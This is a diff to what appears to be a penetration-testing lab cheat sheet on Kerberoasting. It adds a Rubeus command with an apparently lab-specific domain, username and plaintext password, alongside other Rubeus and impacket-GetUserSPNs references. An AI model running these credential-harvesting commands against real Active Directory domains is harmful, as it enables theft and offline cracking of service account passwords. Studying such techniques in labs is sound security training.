@@ -23,6 +23,7 @@ using Rubeus.exe:
 ```bash
  .\Rubeus.exe kerberoast
  .\Rubeus.exe kerberoast /outfile:a.txt
+rubeus.exe kerberoast /domain:MARVEL.local /creduser:MARVEL.local\fcastle /credpassword:Password@123 /nowrap
 ```
 
 using impacket-GetUserSPNs :
